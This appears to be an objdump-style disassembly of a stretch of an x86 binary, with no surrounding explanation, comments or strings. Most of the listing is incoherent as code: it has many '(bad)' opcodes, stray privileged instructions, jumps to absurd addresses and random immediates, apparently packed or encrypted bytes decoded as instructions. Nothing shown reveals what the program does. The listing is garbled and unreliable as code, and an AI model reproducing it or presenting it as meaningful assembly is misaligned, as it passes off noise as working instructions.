  406ba1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ba3:	addr16 cmp ebx,ebx
  406ba6:	pop    edi
  406ba7:	(bad)  
  406ba8:	fist   WORD PTR [ebx+0x8]
  406bab:	ror    DWORD PTR [esi+0x47],0x49
  406baf:	jmp    0xb21c0cd6
  406bb4:	rcr    dl,1
  406bb6:	cmc    
  406bb7:	mov    ah,0xa7
  406bb9:	repnz popf 
  406bbb:	aaa    
  406bbc:	sub    ebx,ebx
  406bbe:	pop    edi
  406bbf:	jmp    0x9148bf7f
  406bc4:	sub    al,BYTE PTR [esi+0x49]
  406bc7:	jmp    0xa21c0bbe
  406bcc:	push   eax
  406bcd:	(bad)  
  406bcf:	xchg   esp,eax
  406bd0:	ja     0x406bc4
  406bd2:	jne    0x406bdb
  406bd4:	sti    
  406bd5:	fstp   DWORD PTR [edi-0x14]
  406bd8:	cmp    edx,DWORD PTR [ebp+0x8]
  406bdb:	cmp    edx,0xe2e94945
  406be1:	lahf   
  406be2:	(bad)  [ecx]
  406be4:	push   ecx
  406be5:	(bad)  
  406be7:	push   esp
  406be8:	inc    eax
  406be9:	repnz ins DWORD PTR es:[edi],dx
  406beb:	xlat   BYTE PTR ds:[ebx]
  406bec:	stos   BYTE PTR es:[edi],al
  406bed:	fstp   DWORD PTR [edi-0x40]
  406bf0:	pop    esi
  406bf1:	push   ebp
  406bf2:	or     BYTE PTR [ecx-0x3b],dl
  406bf5:	inc    ebp
  406bf6:	dec    ecx
  406bf7:	jmp    0x406bfc
	...
  406c0c:	mov    dl,0x9f
  406c0e:	(bad)  [ecx]
  406c10:	push   ecx
  406c11:	(bad)  
  406c13:	xor    al,0x10
  406c15:	repnz inc ebp
  406c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c18:	jp     0x406bf3
  406c1a:	pop    edi
  406c1b:	mov    ds:0x10854de,al
  406c20:	push   ebp
  406c21:	inc    ebp
  406c22:	dec    ecx
  406c23:	jmp    0x11c0b8a
  406c28:	popf   
  406c29:	iret   
  406c2a:	idiv   dh
  406c2c:	fcomp  st(5)
  406c2e:	out    dx,al
  406c2f:	arpl   WORD PTR ss:[edx-0x9],bp
  406c33:	push   0x47c1e5
  406c38:	fnstsw WORD PTR [ebx+ebx*2]
  406c3b:	inc    ecx
  406c3c:	mov    ch,0x6a
  406c3e:	cmp    eax,0xf6d0edd3
  406c43:	(bad)  
  406c44:	fcomp  st(5)
  406c46:	out    dx,al
  406c47:	push   ds
  406c48:	push   ebx
  406c49:	push   0xfffffff7
  406c4b:	push   0x47c1b0
  406c50:	int    0x3c
  406c52:	pop    ebx
  406c53:	inc    ecx
  406c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c55:	push   0x3d
  406c57:	sar    DWORD PTR ds:0x18fef6d0,cl
  406c5d:	fucomp st(6)
  406c5f:	push   es
  406c60:	mov    ds:0x8c68f76a,eax
  406c65:	mov    BYTE PTR [edi+0x0],0xfd
  406c69:	stc    
  406c6a:	pop    edx
  406c6b:	inc    ecx
  406c6c:	jne    0x406c2b
  406c6e:	or     BYTE PTR [eax],al
	...
  406c84:	gs adc eax,0x3d6d75f7
  406c8a:	out    0xfd,eax
  406c8c:	xor    ah,BYTE PTR [edi+0x60]
  406c8f:	sti    
  406c90:	xchg   ch,dl
  406c92:	mul    BYTE PTR [edi-0x1a]
  406c95:	ret    0x47
  406c98:	int    0x96
  406c9a:	or     BYTE PTR [eax],al
  406c9c:	mov    ch,0x67
  406c9e:	jge    0x406ca8
  406ca0:	cmp    eax,0xe2fff548
  406ca5:	mov    bh,0xf6
  406ca7:	push   ebx
  406ca8:	fs nop
  406caa:	pusha  
  406cab:	scas   eax,DWORD PTR es:[edi]
  406cac:	(bad)  
  406cad:	aad    0xf6
  406caf:	not    DWORD PTR [si-0x7ff8]
  406cb4:	mov    WORD PTR [edx],es
  406cb6:	inc    DWORD PTR [edi]
  406cb8:	in     al,0x2b
  406cba:	addr16 (bad) 
  406cbc:	jmp    0x406c40
  406cbe:	not    DWORD PTR [ebx+0x4d]
  406cc1:	jmp    0x406c95
  406cc3:	scas   al,BYTE PTR es:[edi]
  406cc4:	aas    
  406cc5:	lods   al,BYTE PTR ds:[esi]
  406cc6:	or     al,0x68
  406cc8:	mov    gs,ebx
  406cca:	or     al,BYTE PTR [eax-0x180d4835]
  406cd0:	div    BYTE PTR [edi]
  406cd2:	jmp    DWORD PTR gs:[esp+edx*2]
  406cd6:	fld    DWORD PTR [eax-0x74]
  406cd9:	rcr    DWORD PTR [ebp+0x53],cl
  406cdc:	dec    ebp
  406cdd:	jmp    0x406cb1
  406cdf:	add    DWORD PTR [ebx+ebp*8-0xcde0076],ecx
  406ce6:	push   edx
  406ce7:	xchg   ebx,eax
	...
  406cfc:	xchg   ecx,eax
  406cfd:	test   eax,0x1b876865
  406d02:	retf   0xebff
  406d05:	mov    al,ds:0x158c40d9
  406d0a:	or     DWORD PTR [eax],eax
  406d0c:	mov    WORD PTR [ebp+0x65],gs
  406d0f:	jne    0x406ca5
  406d11:	test   eax,edi
  406d13:	cld    
  406d14:	arpl   di,dx
  406d16:	sar    bh,cl
  406d18:	mov    edi,0x39680b2c
  406d1d:	sti    
  406d1e:	leave  
  406d1f:	push   DWORD PTR [ebx+0xc000aeb]
  406d25:	mov    bh,0xfd
  406d27:	pop    es
  406d28:	and    al,0x49
  406d2a:	push   DWORD PTR [bp+di]
  406d2d:	push   esi
  406d2e:	not    DWORD PTR [ebx-0x33]
  406d31:	in     eax,dx
  406d32:	rcl    ah,cl
  406d34:	mov    edi,0x8e680cac
  406d39:	in     eax,dx
  406d3a:	or     al,BYTE PTR [eax-0x180b5eed]
  406d40:	pop    edx
  406d41:	xchg   esp,eax
  406d42:	lods   al,BYTE PTR ds:[esi]
  406d43:	ins    BYTE PTR es:[edi],dx
  406d44:	add    ebp,DWORD PTR [ebx+0xb]
  406d47:	ins    DWORD PTR es:[edi],dx
  406d48:	or     DWORD PTR [ecx+ecx*4-0x7a280e06],0xf3d7aed9
  406d53:	sti    
  406d54:	jmp    0x406d2d
  406d56:	jae    0x406dc4
  406d58:	fld    TBYTE PTR [edx-0x23]
  406d5b:	ins    BYTE PTR es:[edi],dx
  406d5c:	pop    ecx
  406d5d:	mov    WORD PTR [ecx+0x76],cs
	...
  406d73:	add    cl,cl
  406d75:	xlat   BYTE PTR ds:[ebx]
  406d76:	ins    DWORD PTR es:[edi],dx
  406d77:	ins    BYTE PTR es:[edi],dx
  406d78:	cmp    eax,ebx
  406d7a:	push   ebp
  406d7b:	not    BYTE PTR [ebx-0x4cbbe514]
  406d81:	xlat   BYTE PTR ds:[ebx]
  406d82:	daa    
  406d83:	inc    ecx
  406d84:	nop
  406d85:	xchg   esp,eax
  406d86:	xchg   esp,eax
  406d87:	js     0x406d39
  406d89:	adc    esi,DWORD PTR [edi+edi*8-0x243d9c65]
  406d90:	xor    DWORD PTR [eax-0x60],eax
  406d93:	add    ecx,DWORD PTR [ebx-0x32a4029f]
  406d99:	into   
  406d9a:	adc    eax,0xe16cdc6c
  406d9f:	add    esp,DWORD PTR [ebx+0x16]
  406da2:	mov    cl,0x6c
  406da4:	loope  0x406d32
  406da6:	sbb    DWORD PTR [ebx+0x5af5d774],esp
  406dac:	or     dl,dl
  406dae:	std    
  406daf:	imul   esp,esp,0x67
  406db2:	popf   
  406db3:	ret    0xd64b
  406db6:	push   ebx
  406db7:	clc    
  406db8:	sub    esi,DWORD PTR [edi+ebp*4+0x49443b6b]
  406dbf:	add    eax,0xd486e78c
  406dc4:	sub    ah,BYTE PTR [ecx-0x7]
  406dc7:	pop    ebx
  406dc8:	mov    ds:0x246bb5ec,eax
  406dcd:	imul   ecx,DWORD PTR [eax],0x5fd7a7ab
  406dd3:	imul   ebx,esp,0x53
  406dd6:	or     BYTE PTR [esi+0x0],ah
	...
  406dec:	std    
  406ded:	mov    ah,al
  406def:	sahf   
  406df0:	dec    ebp
  406df1:	xlat   BYTE PTR ds:[ebx]
  406df2:	idiv   BYTE PTR [ecx]
  406df4:	rcl    BYTE PTR [eax+ecx*1-0x8bbc982],1
  406dfb:	cld    
  406dfc:	out    0xee,eax
  406dfe:	push   ebp
  406dff:	xchg   ecx,eax
  406e00:	xlat   BYTE PTR ds:[bx]
  406e02:	fbld   TBYTE PTR ds:0xa0f6d74a
  406e08:	push   edx
  406e09:	mov    WORD PTR [eax],cs
  406e0b:	mov    esp,0xd4f6e842
  406e10:	ret    
  406e11:	out    dx,al
  406e12:	pushf  
  406e13:	das    
  406e14:	daa    
  406e15:	xlat   BYTE PTR ds:[ebx]
  406e16:	add    ch,BYTE PTR [ecx]
  406e18:	pushf  
  406e19:	jl     0x406e7b
  406e1b:	call   0xb537:0x990853d3
  406e22:	into   
  406e23:	ss daa 
  406e25:	inc    esp
  406e26:	pop    eax
  406e27:	cs jge 0x406db8
  406e2a:	loopne 0x406dc1
  406e2c:	not    ch
  406e2e:	not    BYTE PTR [ecx]
  406e30:	xchg   edx,edx
  406e32:	not    BYTE PTR [esi]
  406e34:	mov    cl,0xd2
  406e36:	(bad)  
  406e37:	call   0x6b247978
  406e3c:	int3   
  406e3d:	hlt    
  406e3e:	popa   
  406e3f:	jmp    0xf658ce2a
  406e44:	pop    esp
  406e45:	mov    dh,bh
  406e47:	mov    ah,0xe2
  406e49:	dec    esp
  406e4a:	dec    ecx
  406e4b:	jmp    0xdf0de937
	...
  406e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e65:	or     ecx,DWORD PTR [ebp-0x23]
  406e68:	push   ecx
  406e69:	(bad)  
  406e6a:	cmc    
  406e6b:	push   esp
  406e6c:	jl     0x406e43
  406e6e:	jl     0x406e70
  406e70:	sbb    DWORD PTR [ebx+0x3d],ebp
  406e73:	rcr    DWORD PTR [ebp-0x31],cl
  406e76:	mul    bh
  406e78:	and    DWORD PTR [ebp-0x9],edx
  406e7b:	jmp    FWORD PTR [esp+edx*8-0xe]
  406e7f:	push   0xfffffff5
  406e81:	push   0x7d
  406e83:	sbb    BYTE PTR [edx],bl
  406e85:	in     eax,0x2
  406e87:	call   eax
  406e89:	ds inc eax
  406e8b:	inc    ecx
  406e8c:	cmc    
  406e8d:	cmp    esi,esp
  406e8f:	les    ecx,FWORD PTR [edx]
  406e91:	imul   eax,DWORD PTR [ecx+0x4d5d0d45],0xffffffe8
  406e98:	jne    0x406f03
  406e9a:	jge    0x406eb8
  406e9c:	cmp    ah,ah
  406e9e:	add    bh,bh
  406ea0:	mov    al,ds:0xa541403d
  406ea5:	cmp    esi,ebx
  406ea7:	les    ebx,FWORD PTR [edx+0x6a]
  406eaa:	add    DWORD PTR [ebp+0x45],0xe0fef6b7
  406eb1:	mov    cl,0xf7
  406eb3:	jne    0x406e5e
  406eb5:	push   0x3d
  406eb7:	shr    ebp,cl
  406eb9:	shl    dh,1
  406ebb:	out    0xb5,eax
  406ebd:	xchg   ebp,eax
  406ebe:	idiv   edi
  406ec0:	cld    
  406ec1:	aam    0xe2
  406ec3:	lea    esi,[eax]
  406ec5:	jno    0x406f1f
  406ec7:	inc    DWORD PTR [eax]
	...
  406ed9:	add    BYTE PTR [eax],al
  406edb:	add    BYTE PTR [eax],dl
  406edd:	jne    0x406ed6
  406edf:	jne    0x406f2a
  406ee1:	push   0x3d
  406ee3:	rcr    DWORD PTR ds:0xbde7f6d0,cl
  406ee9:	xchg   ebp,eax
  406eea:	idiv   edi
  406eec:	in     al,dx
  406eed:	aam    0xea
  406eef:	cmp    DWORD PTR [eax-0x4ef0f793],0x4
  406ef6:	or     BYTE PTR [eax],al
  406ef8:	and    eax,0x8cf87510
  406efd:	jmp    0x406eee
  406eff:	adc    DWORD PTR [esi],0xffffffeb
  406f02:	or     al,BYTE PTR [eax]
  406f04:	(bad)  
  406f06:	js     0x406f08
  406f08:	mov    ebp,DWORD PTR [edi-0x74]
  406f0b:	add    BYTE PTR [ebx+ebp*8+0x26b4755f],cl
  406f12:	out    0x7,eax
  406f14:	hlt    
  406f15:	xlat   BYTE PTR ds:[ebx]
  406f16:	mov    al,ds:0xe6f5fbff
  406f1b:	sti    
  406f1c:	repz ja 0x406f13
  406f1f:	out    0x78,eax
  406f21:	inc    ebp
  406f22:	popa   
  406f23:	jmp    ebx
  406f25:	xlat   BYTE PTR ds:[ebx]
  406f26:	(bad)  
  406f27:	jmp    DWORD PTR [ecx-0x1d]
  406f2a:	push   edx
  406f2b:	popa   
  406f2c:	adc    bl,BYTE PTR [esi+0x61]
  406f2f:	inc    DWORD PTR [ecx+0x5f]
  406f32:	popa   
  406f33:	jne    0x406ec9
  406f35:	inc    ebx
  406f36:	fidivr DWORD PTR [ebp+0x7d8b35bb]
  406f3c:	fimul  DWORD PTR fs:[edx]
  406f3f:	out    dx,eax
	...
  406f54:	jmp    0x619b:0x19fefdbf
  406f5b:	jne    0x406ee1
  406f5d:	inc    ebx
  406f5e:	into   
  406f5f:	mov    ebp,0xe559d93
  406f64:	mov    ecx,DWORD PTR [ecx]
  406f66:	push   ebx
  406f67:	(bad)  
  406f68:	stc    
  406f69:	lods   eax,DWORD PTR ds:[esi]
  406f6a:	popa   
  406f6b:	jne    0x406ef1
  406f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f6e:	or     bh,BYTE PTR [esi+0x7561ab73]
  406f74:	js     0x406f19
  406f76:	out    0x7,eax
  406f78:	je     0x406f5d
  406f7a:	mov    al,ds:0xef3f5bff
  406f7f:	jecxz  0x406f0d
  406f81:	push   ecx
  406f82:	push   es
  406f83:	or     ecx,0xffffff9d
  406f86:	or     BYTE PTR [ebp-0x6d],dh
  406f89:	xchg   esp,eax
  406f8a:	jp     0x406f4a
  406f8c:	das    
  406f8d:	aam    0x10
  406f8f:	imul   edi,DWORD PTR [ecx-0x16683664],0x965cc5d3
  406f99:	ds loope 0x407004
  406f9c:	mov    eax,ds:0xd1a3d99c
  406fa1:	sar    DWORD PTR [ebp-0x37377e98],cl
  406fa7:	pusha  
  406fa8:	int3   
  406fa9:	shr    DWORD PTR [ebp-0x672f7e98],cl
  406faf:	dec    eax
  406fb0:	int3   
  406fb1:	rcr    DWORD PTR [ebp-0x77339e98],cl
  406fb7:	push   eax
	...
  406fcc:	int3   
  406fcd:	ror    DWORD PTR [ebp-0x673b9e98],cl
  406fd3:	cmp    ah,cl
  406fd5:	sar    DWORD PTR [ebp+0x68],cl
  406fd8:	inc    ecx
  406fd9:	ror    BYTE PTR [eax+0x6dd3cc40],0x68
  406fe0:	inc    ecx
  406fe1:	mov    eax,0xd3cca858
  406fe6:	pop    ebp
  406fe7:	cmp    cl,dh
  406fe9:	js     0x406fcc
  406feb:	into   
  406fec:	push   ss
  406fed:	rcr    DWORD PTR [edi+0x3f],0x9c
  406ff1:	retf   
  406ff2:	xor    eax,0xe1a72468
  406ff7:	pop    eax
  406ff8:	dec    edx
  406ff9:	cmp    al,0x48
  406ffb:	iret   
  406ffc:	int3   
  406ffd:	xchg   esp,eax
  406ffe:	cdq    
  406fff:	dec    ecx
  407000:	loopne 0x407057
  407002:	loope  0x406fdf
  407004:	push   esp
  407005:	push   0xe3f403a0
  40700a:	mov    esp,0x3b3b63c2
  40700f:	iret   
  407010:	int3   
  407011:	xchg   esp,eax
  407012:	cdq    
  407013:	dec    edi
  407014:	mov    eax,0xb4e90855
  407019:	dec    ecx
  40701a:	add    al,0xee
  40701c:	xor    DWORD PTR [ebx-0x2c4daf20],ebx
  407022:	not    BYTE PTR [ecx-0x61]
  407025:	xchg   esp,eax
  407026:	out    0x97,eax
  407028:	dec    eax
  407029:	jge    0x407088
  40702b:	sub    BYTE PTR [eax+0x1c2d3c],cl
	...
  407041:	add    BYTE PTR [eax],al
  407043:	add    BYTE PTR [ecx-0x2d],dl
  407046:	outs   dx,BYTE PTR ds:[esi]
  407047:	loopne 0x407085
  407049:	push   esp
  40704a:	or     BYTE PTR [ecx-0x6f],al
  40704d:	imul   ecx,DWORD PTR [ecx-0x17],0x285bc7e7
  407054:	nop
  407055:	cmp    al,0x5
  407057:	xor    al,0xc9
  407059:	shl    ch,cl
  40705b:	sbb    al,0xe4
  40705d:	sar    DWORD PTR [ecx+eiz*8+0x47],1
  407061:	(bad)  
  407062:	test   BYTE PTR [esi-0x16e3c38d],0x3a
  407069:	adc    ah,BYTE PTR [eax+0x63]
  40706c:	fst    QWORD PTR [ebx+0x8]
  40706f:	add    DWORD PTR [ecx-0x2816b699],esi
  407075:	cmp    bl,BYTE PTR [ebp-0x58]
  407078:	(bad)  
  407079:	cmp    al,0x4e
  40707b:	mov    esp,0x146ed2d0
  407080:	mov    ebp,0xcad10853
  407085:	addr16 dec ecx
  407087:	jmp    0x3644b9b6
  40708c:	jge    0x407028
  40708e:	loopne 0x40706c
  407090:	jmp    0x4db56766
  407095:	into   
  407096:	push   edi
  407097:	push   ds
  407098:	jge    0x407038
  40709a:	neg    esp
  40709c:	mov    esi,0xc7e9495c
  4070a1:	pop    esp
  4070a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a3:	add    BYTE PTR [ebp-0x6a],ah
  4070a6:	add    eax,eax
	...
  4070bc:	fdivr  DWORD PTR [ebx-0x69c2ba33]
  4070c2:	or     BYTE PTR [eax],al
  4070c4:	xor    eax,0x32f44d93
  4070c9:	shl    esi,cl
  4070cb:	(bad)  
  4070cc:	fistp  WORD PTR [eax-0x6730ff9e]
  4070d2:	bound  eax,QWORD PTR [eax]
  4070d4:	rcl    ah,0xfa
  4070d7:	push   eax
  4070d8:	mov    al,ds:0xd2f7fc14
  4070dd:	cmp    bl,BYTE PTR [eax-0x1]
  4070e0:	enter  0xf740,0x75
  4070e4:	xor    DWORD PTR [esi+0x16],ebp
  4070e7:	lods   al,BYTE PTR ds:[esi]
  4070e8:	in     eax,0x95
  4070ea:	add    eax,eax
  4070ec:	cdq    
  4070ed:	xchg   esi,eax
  4070ee:	jecxz  0x407130
  4070f0:	lea    ebp,[ecx]
  4070f2:	inc    eax
  4070f3:	inc    ecx
  4070f4:	cmc    
  4070f5:	cmp    bh,BYTE PTR [ebp+0xc]
  4070f8:	std    
  4070f9:	ret    
  4070fa:	leave  
  4070fb:	call   DWORD PTR [edx+0x4e]
  4070fe:	fmul   DWORD PTR [ebp-0xbec8]
  407104:	xor    ah,ch
  407106:	pop    eax
  407107:	call   0x37c826
  40710c:	cmp    al,0x14
  40710e:	clc    
  40710f:	test   DWORD PTR [edx+0x3a],0x4245b5f7
  407116:	idiv   edi
  407118:	push   edx
  407119:	les    ecx,FWORD PTR [esi]
  40711b:	call   0x37a878
	...
  407134:	ret    0xf804
  407137:	div    DWORD PTR [edx-0xd5a1fc6]
  40713d:	cmp    dh,bh
  40713f:	jmp    FWORD PTR [eax]
  407141:	cmp    eax,0xaa8c95e3
  407146:	clc    
  407147:	sti    
  407148:	je     0x4071c1
  40714a:	xchg   edx,eax
  40714b:	add    BYTE PTR [esp+eax*4+0x288c0849],cl
  407152:	jb     0x407140
  407154:	movq   QWORD PTR [edi+0x6a],mm5
  407158:	mov    WORD PTR ds:0xc3c1fef5,ss
  40715e:	push   edx
  40715f:	mov    edx,0x896cf1f0
  407164:	shl    edi,1
  407166:	rcl    DWORD PTR [eax-0xf38348],cl
  40716c:	mov    eax,ds:0x12b752c3
  407171:	adc    ch,BYTE PTR [ebp+0x6a]
  407174:	mov    WORD PTR [ebx-0x52],ss
  407177:	push   esp
  407178:	dec    ebp
  407179:	mov    ebx,0x7c6090d2
  40717e:	or     al,0xff
  407180:	mov    ecx,0x8c40b40e
  407185:	adc    edi,ecx
  407187:	shl    ebx,0x21
  40718a:	icebp  
  40718b:	mov    edi,0x4fdaca60
  407190:	rol    edi,cl
  407192:	repnz out 0x21,eax
  407195:	inc    edi
  407196:	ins    DWORD PTR es:[edi],dx
  407197:	inc    DWORD PTR [eax]
	...
  4071a9:	add    BYTE PTR [eax],al
  4071ab:	add    BYTE PTR [edx+esi*2-0x1b440053],dh
  4071b2:	or     ch,BYTE PTR [eax-0x3]
  4071b5:	add    cl,dl
  4071b7:	push   DWORD PTR [ebx]
  4071b9:	pop    ds
  4071ba:	fadd   DWORD PTR [eax-0x74]
  4071bd:	bound  esp,QWORD PTR [edi]
  4071bf:	rol    DWORD PTR [esp+edi*8+0xa],cl
  4071c3:	call   0xffadef0d
  4071c8:	xchg   edi,eax
  4071c9:	jge    0x4071c3
  4071cb:	push   cs
  4071cc:	fsubr  QWORD PTR ds:0x9484756c
  4071d2:	sbb    ecx,ebx
  4071d4:	ja     0x4071a6
  4071d6:	adc    eax,0x1e0f8a5c
  4071db:	not    BYTE PTR gs:[ecx+ecx*4-0x1eaa3f5b]
  4071e3:	(bad)  
  4071e5:	push   0x92b403a0
  4071ea:	loope  0x4071ef
  4071ec:	or     al,0xbd
  4071ee:	rol    BYTE PTR [ecx+0x3b],0xd0
  4071f2:	stc    
  4071f3:	inc    ebx
  4071f4:	mov    eax,0x2ad4319f
  4071f9:	dec    edx
  4071fa:	jmp    0xc611405a
  4071ff:	fs and al,0xca
  407202:	mov    fs,WORD PTR [ebx+edx*1+0x3b]
  407206:	loope  0x4071e3
  407208:	cmp    al,0x5d
  40720a:	and    BYTE PTR [esp+esi*2],al
  40720d:	clc    
  40720e:	sbb    al,0xc3
	...
  407224:	sti    
  407225:	aaa    
  407226:	jecxz  0x40722b
  407228:	mov    WORD PTR [ecx+ebx*4],ss
  40722b:	ins    BYTE PTR es:[edi],dx
  40722c:	int    0xcf
  40722e:	popf   
  40722f:	clc    
  407230:	and    ecx,DWORD PTR [ecx-0x2a]
  407233:	ror    DWORD PTR [ebx-0x31],cl
  407236:	repz sti 
  407238:	jmp    0x4071e7
  40723a:	jne    0x4072a0
  40723c:	retf   
  40723d:	mov    esp,0xcfc3a5ac
  407242:	or     cl,BYTE PTR [edx]
  407244:	mov    ebx,0x365bf949
  407249:	rcl    BYTE PTR [ebp+0x64],1
  40724c:	ss jae 0x4072ad
  40724f:	out    dx,al
  407250:	mov    edi,DWORD PTR [eax+edx*8-0x25306499]
  407257:	pop    es
  407258:	xchg   ebx,eax
  407259:	dec    ecx
  40725a:	stc    
  40725b:	pop    ebx
  40725c:	repnz rol BYTE PTR [edi],1
  40725f:	ss call 0xf06def34
  407265:	dec    ecx
  407266:	add    BYTE PTR [ecx],dl
  407268:	scas   al,BYTE PTR es:[edi]
  407269:	adc    bh,dh
  40726b:	push   ds
  40726c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40726d:	ror    BYTE PTR [ebx],cl
  40726f:	jmp    0x6b248cc6
  407274:	fwait
  407275:	rcr    BYTE PTR [ebp-0x62],1
  407278:	xor    eax,0xb0e660cf
  40727d:	dec    ecx
  40727e:	add    BYTE PTR [ecx],al
  407280:	int3   
  407281:	or     esi,edi
  407283:	out    dx,al
  407284:	mov    ch,0x59
  407286:	hlt    
  407287:	jb     0x407289
	...
  407299:	add    BYTE PTR [eax],al
  40729b:	add    BYTE PTR [ebp-0x6fd7bf99],dl
  4072a1:	sbb    esi,DWORD PTR ds:0x8545032
  4072a7:	imul   ebp,DWORD PTR [edi-0x6c],0x2a203a7c
  4072ae:	pop    ebp
  4072af:	sub    BYTE PTR [eax+0x32c9e067],dl
  4072b5:	xchg   esp,eax
  4072b6:	or     dl,ah
  4072b8:	dec    edi
  4072b9:	dec    eax
  4072ba:	pop    ss
  4072bb:	aas    
  4072bc:	pusha  
  4072bd:	mov    al,al
  4072bf:	sahf   
  4072c0:	outs   dx,DWORD PTR ds:[esi]
  4072c1:	fs pusha 
  4072c3:	jmp    0x1f63257
  4072c8:	imul   DWORD PTR [eax+0x49]
  4072cb:	jmp    0xf1bd40ef
  4072d0:	aaa    
  4072d1:	push   esp
  4072d2:	out    dx,eax
  4072d3:	jbe    0x407304
  4072d5:	mov    esp,0xcf2f2f40
  4072da:	pop    edi
  4072db:	nop
  4072dc:	cmc    
  4072dd:	push   ebx
  4072de:	or     BYTE PTR [esi-0x165dfdc9],dh
  4072e4:	(bad)  
  4072e5:	fwait
  4072e6:	enter  0x8ed5,0x66
  4072ea:	loopne 0x4072ec
  4072ec:	mov    ds:0x25fff75a,eax
  4072f1:	mov    edx,0xf2cafff6
  4072f6:	pop    edi
  4072f7:	mov    bh,0x20
  4072f9:	fdecstp 
  4072fb:	dec    edi
  4072fc:	stos   BYTE PTR es:[edi],al
  4072fd:	jmp    0x40730d
  4072ff:	call   0x407304
	...
  407314:	addr16 cmp esi,edi
  407317:	dec    DWORD PTR [ebp-0x75004b33]
  40731d:	cmp    eax,0x72e54609
  407322:	or     BYTE PTR [ebp-0x71],dh
  407325:	(bad)  
  407327:	xor    esi,DWORD PTR [ebp+0x2f]
  40732a:	idiv   edi
  40732c:	sub    dh,BYTE PTR [ebx]
  40732e:	cli    
  40732f:	scas   al,BYTE PTR es:[edi]
  407330:	ins    DWORD PTR es:[edi],dx
  407331:	cdq    
  407332:	jge    0x4072c1
  407334:	dec    edx
  407335:	in     eax,dx
  407336:	repnz inc eax
  407339:	mov    al,ds:0x32fe77e0
  40733e:	neg    DWORD PTR [edi+0x6b]
  407341:	pop    edi
  407342:	retf   0xf504
  407345:	or     al,0x82
  407347:	in     al,dx
  407348:	dec    ebp
  407349:	cwde   
  40734a:	or     bh,ch
  40734c:	imul   edi,DWORD PTR [ecx-0x675baa31],0xfffffff7
  407353:	jne    0x40734e
  407355:	xor    bh,BYTE PTR [ebp+0x8]
  407358:	or     eax,0xaffee65
  40735d:	mov    edx,0xf3fa0007
  407362:	pop    edi
  407363:	fisub  WORD PTR [eax-0x3f010929]
  407369:	popf   
  40736a:	div    DWORD PTR [ebp-0x53]
  40736d:	cmp    DWORD PTR [eax-0x3ecdd51a],esi
  407373:	ret    0x919d
  407376:	pop    ebp
  407377:	mov    eax,DWORD PTR [eax]
	...
  407389:	add    BYTE PTR [eax],al
  40738b:	add    BYTE PTR [edi+edx*2+0x5388756a],cl
  407392:	sbb    al,dl
  407394:	xchg   ebx,eax
  407395:	push   esi
  407396:	push   es
  407397:	rol    BYTE PTR [eax],0xb2
  40739a:	loop   0x40735e
  40739c:	frndint 
  40739e:	or     dl,BYTE PTR [eax+0x64]
  4073a1:	bound  ecx,QWORD PTR [edi+edi*8+0x73]
  4073a5:	or     edi,DWORD PTR [ebx+0x62c3e1fe]
  4073ab:	stos   DWORD PTR es:[edi],eax
  4073ac:	arpl   WORD PTR [esi+0x5ff5e86a],sp
  4073b2:	push   0xffffffff
  4073b4:	inc    ebp
  4073b5:	jns    0x4073ba
  4073b7:	add    cl,ah
  4073b9:	inc    edx
  4073ba:	or     DWORD PTR [bx+si-0x39],0xffffffe3
  4073bf:	jmp    DWORD PTR [ebp-0x7b8a964d]
  4073c5:	jecxz  0x40735b
  4073c7:	mov    edx,0x4582ee2b
  4073cc:	and    BYTE PTR [ecx+0xc],dl
  4073cf:	push   0xffcb84e2
  4073d4:	stos   DWORD PTR es:[edi],eax
  4073d5:	fidivr DWORD PTR [esi+0x1f0e8c40]
  4073db:	rcl    DWORD PTR [esp+edi*2+0xc],cl
  4073df:	call   0xffa96ef1
  4073e4:	xchg   ebx,edi
  4073e6:	iret   
  4073e7:	adc    edi,DWORD PTR [ebx+eiz*4]
  4073ea:	or     eax,DWORD PTR [eax]
  4073ec:	repz fs mov esp,0xfe
	...
  407403:	add    BYTE PTR [ecx-0x4d],ah
  407406:	bound  esp,QWORD PTR [ebx-0x11]
  407409:	adc    eax,0x905de869
  40740e:	imul   edi,edi,0xb5e2bb36
  407414:	bound  edi,QWORD PTR [esp+ecx*1+0x68]
  407418:	test   BYTE PTR [edi+esi*4+0x1bcdabc2],dl
  40741f:	xor    eax,0x6be15354
  407424:	ds aam 0x45
  407427:	popa   
  407428:	xchg   esp,edx
  40742a:	mov    ah,0xf7
  40742c:	fstp   TBYTE PTR [eax+eiz*8]
  40742f:	add    esi,DWORD PTR [ebx+0xb]
  407432:	xchg   ecx,eax
  407433:	pusha  
  407434:	add    DWORD PTR [ebp-0x3390e7b7],ebx
  40743a:	sub    eax,0x1609ae6c
  40743f:	popa   
  407440:	not    BYTE PTR [ecx+ecx*4-0x1eaa3db7]
  407447:	jmp    0x407416
  407449:	bound  esp,QWORD PTR [eax+0x12824b03]
  40744f:	int3   
  407450:	int3   
  407451:	xchg   esp,eax
  407452:	or     DWORD PTR ds:0xce5cc4c,esp
  407458:	dec    esp
  407459:	inc    ecx
  40745a:	(bad)  
  40745b:	mov    bl,0xdb
  40745d:	retf   
  40745e:	pop    ebx
  40745f:	or     al,0x34
  407461:	lahf   
  407462:	fisub  WORD PTR [eax+0x1b]
  407465:	mov    ebp,0x9fd8
	...
  40747a:	add    BYTE PTR [eax],al
  40747c:	adc    ecx,esp
  40747e:	pop    edx
  40747f:	add    al,0x74
  407481:	rcr    BYTE PTR [esi],cl
  407483:	ret    
  407484:	add    esi,DWORD PTR [ebx+ecx*2]
  407487:	mov    edx,0x16a6944c
  40748c:	fistp  WORD PTR [eax+eiz*1+0x4]
  407490:	hlt    
  407491:	int    0x55
  407493:	pusha  
  407494:	jecxz  0x407435
  407496:	mov    eax,ds:0x31648ad7
  40749b:	popa   
  40749c:	pop    ecx
  40749d:	pushf  
  40749e:	cdq    
  40749f:	arpl   dx,cx
  4074a1:	retf   
  4074a2:	jne    0x40750f
  4074a4:	ror    BYTE PTR [eax],cl
  4074a6:	or     BYTE PTR [esi+0x2c],dh
  4074a9:	or     BYTE PTR ds:[ecx],al
  4074ac:	pop    ebp
  4074ad:	bound  ecx,QWORD PTR [ecx-0x17]
  4074b0:	mov    bh,0xf2
  4074b2:	pop    ebp
  4074b3:	test   al,0x8f
